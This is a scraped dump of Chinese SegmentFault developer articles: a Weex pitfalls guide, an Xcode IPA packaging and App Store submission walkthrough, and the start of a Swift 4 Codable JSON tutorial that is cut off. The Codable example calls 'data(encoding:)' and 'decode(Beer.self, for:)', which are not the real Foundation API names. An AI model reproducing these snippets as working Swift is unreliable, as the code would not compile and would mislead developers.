<p>这里扩展了 <code>Collection</code> 协议，但是限制只适用于集合中的元素遵循了 <code>TextRepresentable</code> 协议的情况。 因为 <code>Swift</code> 中 <code>Array</code> 符合 <code>Collection</code> 协议，而 <code>Circular</code> 类型又符合 <code>TextRepresentable</code> 协议，所以 <code>circulars</code> 可以使用 <code>textualDescription</code> 属性得到数组内容的文本表示</p>

                ", Swift vs. Kotlin 漫谈系列之接口,1531971948,570,1,85,1,1,https://segmentfault.com/a/1190000010065953
55,1,0,6,"
                    
<blockquote><p>在自己的业务环境中使用，并开放给第三方isv，企业开发者使用，这是一篇有内涵有故事的文章。</p></blockquote>
<p>如果你对weex微应用感兴趣，也在开发着微信小程序，不妨来看看为了让你减少顾虑而准备的技术对比表格，是的，开发钉钉的weex微应用是如此的简单。</p>
<p>访问这个链接阅读： <a href=""http://www.jianshu.com/p/d5d7680335de"" rel=""nofollow noreferrer"">钉钉Weex微应用与微信小程序技术对比表格</a> 。</p>
<h2>技术概述</h2>
<p><code>weex</code>是阿里开源的一套构建高性能移动界面的原生跨平台技术框架，它的上层由<code>Vue</code>，<code>Rax（非常类似React的开发框架）</code>实现数据驱动，底层由iOS，Android实现render engine来驱动界面的最终落地。类比<code>React Native</code>它的优势在于难得的<code>一次编写，多端运行</code>，是的，它也很好的支持着移动Web端。</p>
<h3>构建-build</h3>
<p><code>Native</code>使用<code>weex-loader</code>，<code>Web</code>则需要使用<code>vue-loader</code>，在<code>Web</code>端上<code>vue-loader</code>目前仅支持<code>^11.3.3</code>版本，以及<code>weex-vue-render</code>需要<code>&gt;= 0.11.50</code>，并且<code>vue-loader</code>的配置做如下修改：</p>
<ul><li><p>webpack 1.x</p></li></ul>
<pre><code>module: {
  loaders: [
    {
      test: /\.vue(\?[^?]+)?$/,
      loaders: ['vue-loader']
    }
  ]
},
vue: {
  /**
   * important! should use postTransformNode to add $processStyle for
   * inline style normalization.
   */
  compilerModules: [
    {
      postTransformNode: el =&gt; {
        el.staticStyle = `$processStyle(${el.staticStyle})`
        el.styleBinding = `$processStyle(${el.styleBinding})`
      }
    }
  ]
}</code></pre>
<ul><li><p>webpack 2.x</p></li></ul>
<pre><code>module: {
    rules: [
      {
        test: /\.vue$/,
        loader: 'vue-loader',
        options: {
          compilerModules: [
            {
              postTransformNode: el =&gt; {
                el.staticStyle = `$processStyle(${el.staticStyle})`
                el.styleBinding = `$processStyle(${el.styleBinding})`
              }
            }
          ]
        }
      }
    ]
}</code></pre>
<p>最佳的实践是推荐你使用目前为止我们内部评价最高的一份脚手架工程（支持三端一致，意味着处理了降级。）：<a href=""https://github.com/dingtalk-templates/webpack"" rel=""nofollow noreferrer"">dingtalk-templates/webpack</a>，你可以直接下载它，自行修改<code>package.json</code>文件中的<code>{{}}</code> 配置，或者安装 <a href=""https://github.com/open-dingtalk/weex-dingtalk-cli"" rel=""nofollow noreferrer"">open-dingtalk/weex-dingtalk-cli</a> 这个命令行工具来玩转脚手架，这个命令行工具就像你使用<code>vue-cli</code>一样的简单：</p>
<pre><code>$ npm install -g weex-dingtalk-cli</code></pre>
<h3>样式-style</h3>
<blockquote><p>weex支持的样式属于css子集</p></blockquote>
<ul>
<li><p>必须写完整，如<code>background:#000</code>需要写成<code>background-color:#000</code></p></li>
<li><p>样式不允许提取文件，必须写在<code>Vue</code>的单组件中</p></li>
<li><p>原则上不推荐使用<code>预处理器</code>，因为无法预期转译出来的样式符合weex的css子集</p></li>
<li><p>布局只能使用Flexbox</p></li>
<li><p>如果要显示文本必须使用<code>text</code>组件，并且你想改变字体大小必须写在<code>text</code>组件上</p></li>
<li><p>只支持<code>class</code>，不允许继承</p></li>
<li><p>单位只支持<code>px</code></p></li>
<li><p>不支持背景图片</p></li>
<li><p>基于<code>750px</code>进行缩放，会有<code>浮点</code>级别的误差</p></li>
<li><p>样式需要声明 <code>scoped</code> 属性</p></li>
<li><p>Android上处理圆角，必须在外层<code>div</code>中设置<code>border-radius</code></p></li>
<li><p>如果你想动态的替换<code>class</code>，只能使用数组表达式，<code>&lt;div :class=['name', a? 'b': 'c']&gt;&lt;/div&gt;</code></p></li>
</ul>
<p>如果你想使用<code>预处理器</code>（只是不推荐），可以如下配置：</p>
<pre><code>{
    test: /\.vue$/,
    loader: 'vue-loader',
    options: {
        loaders: {
          scss: 'vue-style-loader!css-loader!sass-loader'
        }
    }
}</code></pre>
<pre><code>&lt;style lang=""sass""&gt;
    @import './common.scss'
    // ...
&lt;/style&gt;</code></pre>
<p>如果你想使用更精准的适配（无法忍受浮点级别的误差），可以获取<code>scale</code>，<code>deviceWidth</code>自行进行适配，推荐在<code>loader</code>阶段去处理（自行开发转换工具）。</p>
<h3>JavaScript与内存管理-JavaScript and memory manage</h3>
<blockquote><p>由于JS运行在JavaScriptCore/V8中，此与Web有较大差异。</p></blockquote>
<p>如下：</p>
<ul>
<li><p><code>jquery</code>，<code>axios</code> 之类的原来Web开发领域的库都不可以使用</p></li>
<li><p>不支持DOM操作</p></li>
<li><p>虽然提供了Native DOM可以操作界面的渲染，原则上不推荐使用，方法与DOM操作类似</p></li>
<li><p>既然不支持DOM操作，更改界面的方式应该使用数据驱动</p></li>
<li><p>仅支持部分事件</p></li>
<li><p>weex SDK <code>&gt;= 0.10.0</code> 的才支持事件冒泡</p></li>
<li><p>没有window，document，location，history等对象</p></li>
<li><p>runtime是一个“全局环境”，不允许往全局环境中挂载对象，因为无法释放且所有weex页面共享</p></li>
<li><p>只有scroller和list组件可以滚动</p></li>
<li><p>不允许在Vue中操作<code>style</code>，遍历是很耗性能的</p></li>
<li><p>Vue中的<code>v-show</code>等原来操作Dom的指令或Api都不可以使用</p></li>
<li><p>vue-router 只允许使用 <code>abstract</code> 模式</p></li>
<li><p>vuex必须在初始化之前使用<code>Vue.use</code>注入</p></li>
<li><p>native端只能使用网络图片，解决的方式是在最后上线时统一替换成CDN</p></li>
<li><p>热更新以及增量更新的方式都可以参考React Native目前成熟的方案</p></li>
<li><p>iOS由于使用了同一套URL System，UIWebView的cookie是会共享到weex中的，同理weex中的cookie也是会共享的，只有WKWebView不会。原则上，你不应该使用cookie来处理用户体系的问题</p></li>
</ul>
<blockquote><p>weex native 与 weex web 之间的差异较大，那么怎么办？</p></blockquote>
<p>我们提供了一套抹平一些常见差异的库，你也可以在<code>weex</code>环境中使用，<a href=""https://github.com/open-dingtalk/weex-dingtalk-journey"" rel=""nofollow noreferrer"">https://github.com/open-dingtalk/weex-dingtalk-journey</a>。</p>
<p>在说内存（memory）之前，大家先来看一副图，weex的内存分布：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010023505?w=916&amp;h=958"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""DingTalk20170701160256.png"" title=""DingTalk20170701160256.png""></span></p>
<p>正常情况下，Native memory 业务开发人员是无法处理的，而运行在js core 中的内存，我们知道如果不断开引用，js是无法回收释放内存的。</p>
<ul>
<li><p>不允许往 <code>runtime</code> 里去挂载对象</p></li>
<li><p>业务代码中的一些引用在<code>beforeDestroy</code> 中断开设置为<code>null</code></p></li>
<li><p>学会使用工具分析内存泄漏的问题，<a href=""https://webkit.org/downloads/"" rel=""nofollow noreferrer"">https://webkit.org/downloads/</a></p></li>
<li><p>不要随意的使用函数递归，缩短对象方法的执行路径（传统JS领域的内存管理最佳实践也适用一部分）</p></li>
<li><p>由于界面的渲染需要依赖<code>createInstance(id, code, config, data)</code>，<code>sendTasks(id, tasks)</code>，<code>receiveTasks(id, tasks)</code>发送指令的方式进行通信，你应该减少通信的次数，在更新界面时，合并不必要的通信指令的发送。</p></li>
<li><p>如果你使用vue-router的方式，尽量减少组件之间的共享。</p></li>
</ul>
<h3>转场方式-navigator</h3>
<p>由于<code>weex</code>的特殊性，它的转场方式有几种构成。</p>
<ul>
<li><p><code>weex</code> to <code>weex</code>，如果你需要支持钉钉js-api，那么你应该使用<code>openLink</code>。（如果是你自己实现，使用weex自带的navigator模块）</p></li>
<li><p><code>weex</code> to <code>h5</code> 依然使用<code>openLink</code>，（如果是你自己实现，那么可以通过<code>module</code>的方式来打开一个WebViewController| UIWebView or WKWebView）</p></li>
<li><p><code>native</code> to <code>weex</code> 直接alloc weex 容器的Controller传入Url即可</p></li>
</ul>
<p>如果你使用<code>vue-router</code>，那么配置好你的路由path，使用<code>push</code>，<code>go</code>方法即可，唯一可惜的是使用<code>vue-router</code>的方式较为生硬。</p>
<h3>页面级别的数据传输-Page level data transfer</h3>
<blockquote><p>页面级别的数据传输基本很少会发生，钉钉的开发者推荐统一使用domainStorage方案。</p></blockquote>
<ul>
<li><p><code>weex</code> to <code>weex</code> 通过URL传参数（携带的数据量有限），通过weex storage module</p></li>
<li><p><code>weex</code> to <code>h5</code>，<code>h5</code> to <code>weex</code> 通过URL传参数</p></li>
<li><p><code>native</code> to <code>weex</code> 通过alloc weex 容器中的option或者data传入，前者可以在weex.config中获取，后者可以在vm上下文中获取</p></li>
<li><p><code>weex</code> to <code>native</code> 定义一个跳转native的module，使用native的属性或者init时传入</p></li>
</ul>
<h3>调试工具-Debug Kit used</h3>
<p>weex的调试工具需要额外安装<code>weex-toolkit</code>，<code>weex-devtool</code>，以及在你的Native工程中集成对应的<code>WXDevtool（iOS）</code>。</p>
<p>如果你运行<code>weex debug</code>遇到如下的错误：</p>
<pre><code>Error: EACCES: permission denied, open '/Users/xxx/.xtoolkit/node_modules/weex-devtool/frontend/weex/weex-bundle.js'
    at Error (native)</code></pre>
<p>（非Windows用户）使用<code>sudo</code>即可。</p>
<ul><li><p>不集成 <code>WXDevtool SDK</code></p></li></ul>
<p>首先，你需要安装<code>Weex Playground</code>，可自行在各大市场中下载安装。</p>
<p>不需要指明文件路径，在终端输入：</p>
<pre><code>$ weex debug</code></pre>
<p>先使用 <code>Weex Playground</code> 扫码（启动成功后会弹出一个界面），然后将你的业务代码贴到 <a href=""http://dotwe.org/vue"" rel=""nofollow noreferrer"">这里</a>，注意：</p>
<ul>
<li><p>不允许出现<code>import</code>等导入模块的语法</p></li>
<li><p>安装了<code>Weex Playground</code>的设备和你的电脑必须在同一局域网内</p></li>
</ul>
<p>最后用安装了<code>Weex Playground</code>的设备扫码（业务代码贴过去那里的右侧会出现的二维码）。</p>
<ul><li><p>集成 <code>WXDevtool SDK</code></p></li></ul>
<pre><code>[WXDevTool setDebug:YES];
[WXDevTool launchDevToolDebugWithUrl:@""ws://192.168.1.108:8088/debugProxy/native""];</code></pre>
<p>ws:// xxx.xx..x 这个地址是在用weex debug 在终端里给你输出出来的，如果setDebug为YES会开启debugger模式，反之亦然。</p>
<p>注意<code>setDebug</code>设置为<code>YES</code>。</p>
<h3>原生开发-Native</h3>
<p>请直接阅读 <a href=""https://zhuanlan.zhihu.com/p/25182677"" rel=""nofollow noreferrer"">技术 | Weex入坑之旅</a> ，这是用iOS视角写的一篇文章，大概在半年之前。</p>
<h3>写在最后</h3>
<p>希望大家可以用一个开放的心态来看待<code>weex</code>，它的设计，实现有很多是值得学习的地方，比如多<code>framework</code>支持，<code>共享runtime</code>，<code>module</code>，<code>component</code>，<code>handler</code>等等，非常的自由领域，相当于它设计好了一个<code>render engine</code>，理论上你可以学习它的几个关键接口，知道Native DOM指令后，也能开发出替代Vue的上层框架，不信？你看看Rax即明白了。</p>
<p><code>weex</code>也有一些不足的地方，开发者数量少，社区活跃度不高，很多问题并不一定能被google搜录到。文档确实有一点不完善，native的实现也有一定的bug数量，你看<code>react</code>这么多年了，依然有bug，只要在逐步改进迭代修复，我觉得它就是非常棒的，万事没有十全十美，美中不足的一点瑕疵，说不定才是完美呢。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010023506?w=258&amp;h=258"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""qrcode_for_gh_a08ff7d69ad8_258.jpg"" title=""qrcode_for_gh_a08ff7d69ad8_258.jpg""></span></p>

                ", 最全的weex踩坑攻略-出自大量实践与沉淀,1531971949,290,1,498,1,1,https://segmentfault.com/a/1190000010023500
56,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/bVP9Ma?w=500&amp;h=357"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2017年最新整理出来的xocde打包IPA上架App Store的图文教程分享。</p>
<p>希望能帮助初次上架iOS APP开发者，快速掌握上架流程。</p>
<p>上架遇到问题，可以在帖子下面留言，楼主会一一解答。</p>
<p>分为8 步进行</p>
<p>1、申请iOS证书</p>
<p>2、导入证书到钥匙串</p>
<p>3、xcode配置iOS证书</p>
<p>4、配置xcode打包环境</p>
<p>5、打包并导出IPA包</p>
<p>6、在iTunes Connect创建App</p>
<p>7、上传IPA到iTunes Connect</p>
<p>8、上传IPA成功后到iTunes Connect提交审核</p>
<p>一、申请iOS发布证书和描述文件</p>
<p>1、首先申请一个App IDs（应用身份证）、已申请略过。</p>
<p>APP IDs在后面很多地方用到</p>
<p>首先登录苹果开发者中心，进入证书添加页面。</p>
<p>1.1点击证书、ID及配件文件，进入设置。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlIO?w=650&amp;h=449"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>1.2选择App IDs –&gt;点击+创建一个新的App ID</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlIU?w=650&amp;h=565"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>其中有两项需要你自己填：</p>
<p>第一项Name，用来描述你的App ID，这个随便填，没有什么限制，最好是项目名称，这样方便自己辨识（不允许中文）</p>
<p>第二项Bundle ID (App ID Suffix)，这是你App ID的后缀，需要仔细填写。用来标示我们的 app，使它有一个固定的身份，和你的程序直接相关。填写  Explicit App ID 的格式为：com.company.appName，照着格式写，写个方便记的，后面很多地方要用到。</p>
<p>第三项App Services，默认会选择2项，不能修改，其它根据自己需要的服务选择上，然后点击Continue确认，下一步。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlIW?w=650&amp;h=502"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>检查下没有错的话直接点击Register后点击Done完成App ID的创建。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJb?w=650&amp;h=574"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2、申请发布证书</p>
<p>这里用Appuploader工具直接申请导出p12文件和描述文件，后面上传IPA也要用到。</p>
<p>非常方便的iOS上架辅助工具</p>
<p>2.1打开Appuploader，输入苹果开发者中心账号，登录。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJf?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2.2选择Certification</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJj?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2.3点击+ADD，这里有开发证书等等创建选项，这里选第三项发布证书。</p>
<p>如果你之前有了发布证书也可以不用创建，用之前的也行，苹果规定个人只能创建3个发布证书。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJn?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2.4输入，证书名称（随意） 邮箱（任何邮箱都行） 密码（后面导入钥匙串助手时用到）然后点击ok</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJo?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2.5此时生成了好了一个发布证书，点击p12 File,下载证书文件，保存到电脑。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJv?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>这样发布证书就创建好了。</p>
<p>3、申请发布描述文件</p>
<p>3.1回到软件点击Profiles</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJE?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>3.2点击+ADD，这里有开发描述文件等等选项，这里选发布描述文件。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJH?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>3.3选择APP IDs，之前在开发者中心创建的，这里会自动出现。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJL?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>3.4勾选刚创建的发布证书关联好，输入name，点击ok</p>
<p>注意：如果你之前创建了多个发布证书，下面发布证书框显示多个发布证书，</p>
<p>可以全选，默认最新创建的发布证书，打包时输入最新创建的发布证书密码。</p>
<p>ps：发布证书不同的app可以通用的，描述文件不同就行了。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9KP?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>3.5此时生成了发布描述文件，点击 Download下载到电脑保存</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlJS?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>如此就得到了一个.p12证文件和.mobileprovision描述文件</p>
<p>二、导入iOS证书p12到钥匙串</p>
<p>1、打开钥匙串助手，双击p12文件，默认钥匙串是（登录），注意这里一定要选择（系统）</p>
<p>这样后面打包时iOS证书才不会报错。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9KQ?w=650&amp;h=493"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br><span class=""img-wrap""><img data-src=""/img/bVP9KR?w=768&amp;h=495"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2、导入后提示此证书是由未知颁发机构签名的，因为不是用本机的钥匙串文件申请的iOS证书</p>
<p>不过没关系，设置一下信任就好了</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9KT?w=650&amp;h=414"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>3、双击证书、点击信任，使用此证书时，设置为始终信任。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9KU?w=650&amp;h=416"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>三、xcode配置iOS证书和打包环境</p>
<p>1、用xocde打开你的项目，点击进入设置证书界面。</p>
<p>有两个地方都要设置</p>
<p>选择Code Signing下面的release（发布版）Debugs是测试版，如果打包测试就选测试版，导入iOS发布证书。</p>
<p>上架App Store选择发布版的。</p>
<p>然后选择你刚上传的对应iOS发布证书</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9KX?w=650&amp;h=409"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br><span class=""img-wrap""><img data-src=""/img/bVP9KY?w=650&amp;h=404"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2、回到基本信息设置界面，Bundie 这项填写，最先创建的那个appid，跟创建iOS描述文件时选择的要一样。</p>
<p>现在下面还有个错误提示，因为还没有导入iOS描述文件。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9K2?w=650&amp;h=442"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>3、双击.mobileprovision描述文件，闪一下就自动导入到xcode，不报错表示可以了。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9K3?w=768&amp;h=624"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>4、选择xcode菜单栏如果图所示</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9K6?w=650&amp;h=462"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>5、把Archived修改为Release</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9K9?w=650&amp;h=360"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>6、点击选择设备，选择为打包设备。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9Lb?w=768&amp;h=392"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>四、项目打包IPA包导出</p>
<p>1、选择菜单栏如图所示，如果Archive还是灰色的，说明之前的配置没有生效，退出重新打开下。</p>
<p>点击Archive，开始打包。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9Le?w=650&amp;h=453"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2、打包进度条走完后，会弹出以下界面，点击Expcrt</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9Lf?w=650&amp;h=350"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>3、这里是个人开发账户发布到App Store，所以选择第一项，点击Next。测试调试的选第二项。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9Lh?w=650&amp;h=351"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>4、选择你的开发者账号，还没登录会提示你登录，点击Choose，会检查你的证书是否正确。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9Ll?w=650&amp;h=334"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>5、iOS证书检测通过就到了这一步、点击Export，就会导出 一个文件夹，里面就是IPA文件，大功告成了。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9Ln?w=650&amp;h=351"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br><span class=""img-wrap""><img data-src=""/img/bVP9Lp?w=650&amp;h=366"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>六、在iTunes Connect创建App</p>
<p>5.1回到软件，点击ItunerConnect，进入iTunes Connect进入创建APP。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlKa?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>5.2选择我的APP点击左上角+号选择新建APP，输入你的应用名称，语言，套装ID，之前在开发者中心创建的对应APP IDs</p>
<p>（与刚才创建iOS发布描述文件时所选的appid要一致，这样用iOS证书打包的IPA，上传就能对应识别到）</p>
<p>sku不能写中文，点击创建。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlKg?w=650&amp;h=720"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>5.3这里提示要用到Xcode或者Application loader提交IPA，等下用Appuploader直接在Windows环境下上传ipa，不用Mac也行。</p>
<p>现在APP各项信息都没填写，等下把IPA上传成功了再填写。</p>
<p>这里构建版本旁边还没有出现+号，后面上传了IPA就会出现，等下会用到。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlKj?w=650&amp;h=272"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>七、上传IPA到App Store</p>
<p>7.1打开Appuploader程序，点击Upload.</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlKm?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>7.2选择刚生成的iap包，Appuploader将自动上传你的IPA，当出现以下提示时，说明上传成功，点击deail可以查看APP信息。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlKr?w=650&amp;h=418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>八、回到iTunes Connect提交审核</p>
<p>8.1上传好了IPA，然后回到iTunes Connect，进入填写信息的页面，下边有一个构建版本的选项，之前这旁边没有+号的，如果上传成功了，过几分钟旁边会出现一个加号按钮，点击一下+然后会出现你刚上传的APP，有上传多个版本会出现多个，点选、点击完成即可。</p>
<p>注意：如果一段时间后没有出现+号，可能ipa不符合要求，会有个反馈邮件过来，根据反馈的问题修改后重新上传。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9LO?w=650&amp;h=330"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>8.2然后设置好APP相关的信息、类别，价格、销售服务等。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVP9LY?w=650&amp;h=288"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>截图的话、如果你的应用只支持 iPhone，你只需提供 5.5 英寸的显示屏截图</p>
<p>像素-纵向：1242 x 2208，横向：2208 x 1242</p>
<p>72 dpi、RGB、平展、不透明</p>
<p>高品质 JPEG 或 PNG 图像文件格式）即可。</p>
<p>其他尺寸的勾选引用5.5寸的就行，最多上传5张。</p>
<p>如果你的应用支持iPad，一套 12.9 英寸的屏幕截图就可以满足要求。</p>
<p>APP图标的规格则为1024*1024</p>
<p>8.3设置好相应的APP信息后，点击提交以供审核。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlKK?w=650&amp;h=290"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>8.4提交审核回到我的APP查看会提示正在等待审核，审核有时很快一两天，或要几天时间，常登陆看看审核情况，或看邮件提示。</p>
<p>如果变成可供销售，恭喜你~上架成功了，如果显示被拒绝，点击查看问题，根据反馈修改再重新上传。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOlKQ?w=650&amp;h=328"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>

                ", 2017新整理xocde打包IPA上架App Store详细图文,1531971951,154,1,957,1,1,https://segmentfault.com/a/1190000010008312
57,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010714611"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""2017-06-26-Cover.jpg"" title=""2017-06-26-Cover.jpg""></span><br>Apple 终于在 Swift 4 的 Foundation 的模块中添加了对 JSON 解析的原生支持。</p>
<p>虽然已经有很多第三方类库实现了 JSON 解析，但是能够看到这样一个功能强大、易于使用的官方实现还是不免有些兴奋。</p>
<p>值得注意的是，官方的实现方式适用于任何 Encoder/Decoder ，例如 PropertyListEncoder 。当然如果你需要 XML 格式的内容，可以进行自定义实现。在接下来的内容中，我们将专注于 JSON 格式的解析，因为这是 iOS 开发中最常见的数据格式。</p>
<h2>基础</h2>
<p>如果你的 JSON 数据结构和你使用的 Model 对象结构一致的话，那么解析过程将会非常简单。</p>
<p>下面是一个JSON 格式的啤酒说明：</p>
<pre><code>{
    ""name"": ""Endeavor"",
    ""abv"": 8.9,
    ""brewery"": ""Saint Arnold"",
    ""style"": ""ipa""
}</code></pre>
<p>对应的 Swift 数据结构如下：</p>
<pre><code>enum BeerStyle : String {
    case ipa
    case stout
    case kolsch
    // ...
}

struct Beer {
    let name: String
    let brewery: String
    let style: BeerStyle
}</code></pre>
<p>为了将 JSON 字符串转化为 Beer 类型的实例，我们需要将 Beer 类型标记为 Codable。</p>
<p>Codable 实际上是 Encodable &amp; Decodable 两个协议的组合类型，所以如果你只需要单向转换的话，你可以只选用其中一个。该功能也是 Swift 4 中引入的最重要新特性之一。</p>
<p>Codable 带有默认实现，所以在大多数情形下，你可以直接使用该默认实现进行数据转换。</p>
<pre><code>enum BeerStyle : String, Codable {
   // ...
}

struct Beer : Codable {
   // ...
}</code></pre>
<p>下面只需要创建一个解码器：</p>
<pre><code>let jsonData = jsonString.data(encoding: .utf8)!
let decoder = JSONDecoder()
let beer = try! decoder.decode(Beer.self, for: jsonData)</code></pre>
<p>这样我们就将 JSON 数据成功解析为了 Beer 实例对象。因为 JSON 数据的 Key 与 Beer 中的属性名一致，所以这里不需要进行自定义操作。</p>
<p>需要注意的是，这里直接使用了 try! 操作。因为这里只是简单示例，所以在真实程序中你应该对错误进行捕获并作出对应的处理。</p>
<p>但是，现实中不可能一直都是完美情形，很大几率存在 Key 值与属性名不匹配的情形。</p>
<h2>自定义键值名</h2>
<p>通常情形下，API 接口设计时会采用 snake-case 的命名风格，但是这与 Swift 中的编程风格有着明显的差异。</p>
<p>为了实现自定义解析，我们需要先去看下 Codable 的默认实现机制。</p>
